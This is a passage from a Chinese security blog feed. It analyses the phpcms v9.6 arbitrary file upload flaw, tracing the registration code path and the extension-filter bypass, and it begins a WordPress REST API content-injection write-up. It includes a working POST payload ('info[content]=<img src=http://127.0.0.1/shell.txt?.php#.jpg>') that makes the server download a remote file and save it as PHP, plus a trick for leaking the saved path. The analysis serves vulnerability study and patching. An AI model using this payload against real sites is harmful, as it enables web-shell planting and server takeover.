class="comment">//定义站点id常量</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载用户模块配置</span></span><br><span class="line">$member_setting = getcache(<span class="string">'member_setting'</span>);</span><br><span class="line"><span class="keyword">if</span>(!$member_setting[<span class="string">'allowregister'</span>]) &#123;</span><br><span class="line">showmessage(L(<span class="string">'deny_register'</span>), <span class="string">'index.php?m=member&amp;c=index&amp;a=login'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成了对<code>siteid</code>的定义与注册功能是否开启的检验。注意到了<code>$member_setting = getcache(&#39;member_setting&#39;);</code>跟到<code>phpcms/caches_member/member_setting.cache.php</code>，看一下有关会员注册的设置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'allowregister'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'choosemodel'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'enablemailcheck'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'registerverify'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'showapppoint'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'rmb_point_rate'</span> =&gt; <span class="string">'10'</span>,</span><br><span class="line">  <span class="string">'defualtpoint'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'defualtamount'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'showregprotocol'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'regprotocol'</span> =&gt; <span class="string">'省略等等信息'</span></span><br></pre></td></tr></table></figure><p>接下来就是对于post传过来的参数的获取，可以快速跟到130行，看到有我们可控的地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line"><span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，对于<code>modelid</code>是可控的，也就是说<code>member_input</code>的模块调用是可控的。</p><p>其次，就是将我们<code>$_POST[&#39;info&#39;]</code>的参数进行html实体编码，之后调用<code>member_input</code>中的<code>get</code>方法。跟一下，在<code>phpcms/caches/caches_model/caches_data/member_input.class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line"><span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">$field = safe_replace($field);</span><br><span class="line">$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line"><span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line"><span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line"><span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">str_cut($value, $maxlength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">$info[$field] = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br></pre></td></tr></table></figure><p>看到<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>，这里的<code>$this-&gt;fields</code>可以在构造函数中找到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;fields = getcache(<span class="string">'model_field_'</span>.$modelid,<span class="string">'model'</span>);</span><br></pre></td></tr></table></figure><p>可控，默认的<code>$modelid</code>是1，跟着看一下<code>phpcms/caches/caches_model/caches_data/member_input.class.php</code>，看一下<code>formtype</code>的值，大致有下面这么多种：</p><ul><li>catid</li><li>typeid</li><li>title</li><li>keyword</li><li>copyfrom</li><li>textarea</li><li>datetime</li><li>editor</li><li>image</li><li>omipotent</li><li>pages</li><li>posid</li><li>groupid</li><li>islink</li><li>text</li><li>number</li><li>template</li><li>box</li><li>readpoint</li></ul><p>同时对比<code>member_input.class.php</code>中的方法，只有：</p><ul><li>textarea</li><li>editor</li><li>box</li><li>images</li><li>datetime</li></ul><p>看一下每一个方法，其中与文件操作有关的，只有editor方法，记一下<code>formtype=editor</code>的field的名字<code>content</code>。</p><p>现在着重来看一下editor方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于<code>$value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);</code></p><p>跟踪<code>$this-&gt;attachment-&gt;download</code>，回看构造函数，也就是跟踪<code>phpcms/libs/classes/attachment.class.php</code>中的<code>download</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $image_d;</span><br><span class="line"><span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">$uploadpath = $upload_url.$dir;</span><br><span class="line">$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">$string = new_stripslashes($value);</span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">dir_create($uploaddir);</span><br><span class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($matches, $string);</span><br><span class="line">$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">$filename = fileext($file);</span><br><span class="line">$file_name = basename($file);</span><br><span class="line">$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">$newfile = $uploaddir.$filename;</span><br><span class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line"><span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">$oldpath[] = $k;</span><br><span class="line">$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">$fileext = fileext($filename);</span><br><span class="line"><span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">&#125;</span><br><span class="line">$filepath = $dir.$filename;</span><br><span class="line">$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line"><span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看到这串正则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match_all(&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure><p>作用就是检测后缀名，如果不是<code>gif|jpg|jpeg|bmp|png</code>格式的，就是返回原url，直接退出。这边可以直接绕过：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms1.png" alt="phpcms1"></p><p>继续向下，看到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">dir_create($uploaddir);</span><br><span class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$matches[3]</code>就是<code>http://127.0.0.1/shell.txt.php.jpg</code></p><p>又经过了<code>fillurl</code>方法的处理，跟进去看一下，看到关键的地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms2.png" alt="phpcms2"></p><p><code>$BaseUrlPath=&#39;/127.0.0.1/shell.txt.php.jpg&#39;</code></p><p>下一个正则将<code>/</code>去掉，以方便后面的操作：</p><p><code>$BaseUrlPath=&#39;127.0.0.1shell.txt.php.jpg&#39;</code></p><p>接下来看到对于url进行了一个关键的处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure><p>也就是说如果我们构造一个类似于<code>http://127.0.0.1/shell.txt.php#.jpg</code></p><p>再对url进行重组后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line"><span class="keyword">if</span>(strlen($surl)&lt;<span class="number">7</span>)</span><br><span class="line">$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line"><span class="keyword">elseif</span>($preurl==<span class="string">"http:/"</span>||$preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">"rtsp://"</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>)</span><br><span class="line">$okurl = $surl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后返回的<code>$surl=http://127.0.0.1/shell.txt.php</code>并且同时满足前面对于后缀名的限制。</p><p>回到<code>download</code>方法中，接下来的操作对文件名进行了重组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">$filename = fileext($file);</span><br><span class="line">$file_name = basename($file);</span><br><span class="line">$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">$newfile = $uploaddir.$filename;</span><br></pre></td></tr></table></figure><p>首先在这里截取最后一个<code>.</code>之后的后缀作为后缀名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fileext</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> strtolower(trim(substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>, <span class="number">10</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终的文件名就变成了<code>.php</code>结尾的文件。</p><p>之后，<code>$upload_func = $this-&gt;upload_func;</code>，而<code>$this-&gt;upload_func = &#39;copy&#39;;</code>。即调用<code>copy</code>方法进行远程文件下载。</p><h3 id="2-上传路径部分"><a href="#2-上传路径部分" class="headerlink" title="2. 上传路径部分"></a>2. 上传路径部分</h3><p>看一下我们上传的文件的命名情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span><span class="params">($fileext)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> date(<span class="string">'Ymdhis'</span>).rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">'.'</span>.$fileext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传的路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploadpath = $upload_url.$dir;</span><br></pre></td></tr></table></figure><p>而</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'upload_path'</span> =&gt; PHPCMS_PATH.<span class="string">'uploadfile/'</span>,</span><br></pre></td></tr></table></figure><p>上传路径就是<code>uploadfile/年月日时间具体到秒+3位100-999的随机数+文件后缀</code></p><p>这样看，其实可以直接写脚本对文件名进行枚举。</p><p>有没有更简单的方法呢？有。</p><p>回到<code>register</code>方法中，向下看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pc_base::load_config(<span class="string">'system'</span>, <span class="string">'phpsso'</span>)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_phpsso();</span><br><span class="line">$status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line"><span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">$userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line"><span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">$password = $userinfo[<span class="string">'password'</span>];</span><br><span class="line">$userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">$userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;<span class="comment">//如果开启选择模型</span></span><br><span class="line">$user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line"><span class="comment">//插入会员模型数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说会将<code>$userid</code>加入<code>$user_model_info</code>数组中再进行数据库的插入操作（会员新增操作，对应的v9_member_detail数据表）:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms3.png" alt="phpcms3"></p><p>只有两个字段，<code>userid</code>与<code>birthday</code>。但由于$user_model_info数组已经包含了我们之前构造提交的info[content]=xxxxxx的内容，而在插入数据库的时候又没有content字段，所以会导致数据库报错，从而将我们构造的xxxxxx的内容给回显出来，所以就不用暴力去破解文件名了。</p><h3 id="3-POC解释"><a href="#3-POC解释" class="headerlink" title="3. POC解释"></a>3. POC解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure><p>?后的<code>.php</code>被当做shell.txt的参数，所以复制的是shell.txt的内容。</p><h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms4.png" alt="phpcms4"></p><p>简单粗暴的对处理后的文件后缀进行检测。</p><h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>更新吧</p><h1 id="0x05-最后吐槽一句"><a href="#0x05-最后吐槽一句" class="headerlink" title="0x05 最后吐槽一句"></a>0x05 最后吐槽一句</h1><p>顺便把phpcms的源码看了一下，发现phpcms对于安全性的验证真的是简单粗暴，只要是个交互的地方就要调一遍过滤函数，这样死板的做法，可能在安全上会有一些益处，但是势必会对以后的扩展造成阻碍。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简述&quot;&gt;&lt;/a&gt;0x00 漏洞简述&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞简介&quot;&gt;&lt;/a&gt;1. 漏洞简介&lt;/h2&gt;&lt;p&gt;上周phpcms v9.6的任意文件上传的漏洞，已经潜伏半年多的一个漏洞。该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。&lt;/p&gt;
&lt;h2 id=&quot;2-漏洞影响版本&quot;&gt;&lt;a href=&quot;#2-漏洞影响版本&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞影响版本&quot;&gt;&lt;/a&gt;2. 漏洞影响版本&lt;/h2&gt;&lt;p&gt;phpcms v9.6&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>WordPress REST API 内容注入</title>
    <link href="https://lucifaer.com/2017/02/06/WordPress%20REST%20API%20%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/"/>
    <id>https://lucifaer.com/2017/02/06/WordPress REST API 内容注入/</id>
    <published>2017-02-06T10:44:09.000Z</published>
    <updated>2018-11-29T09:34:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>在<code>REST API</code>自动包含在<code>Wordpress4.7</code>以上的版本，<code>WordPress REST API</code>提供了一组易于使用的HTTP端点，可以使用户以简单的JSON格式访问网站的数据，包括用户，帖子，分类等。检索或更新数据与发送HTTP请求一样简单。上周，一个由<code>REST API</code>引起的影响<code>WorePress4.7.0</code>和<code>4.7.1</code>版本的漏洞被披露，该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><ul><li>WordPress4.7.0</li><li>WordPress4.7.1</li></ul><a id="more"></a><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p><a href="https://www.seebug.org/vuldb/ssvid-92637" target="_blank" rel="noopener">Seebug</a>上已经给出详细的复现过程，在复现过程中可以使用<a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">已经放出的POC</a>来进行测试。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>其实漏洞发现者已经给出了较为详细的<a href="https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html" target="_blank" rel="noopener">分析过程</a>，接下来说说自己在参考了上面的分析后的一点想法。</p><h2 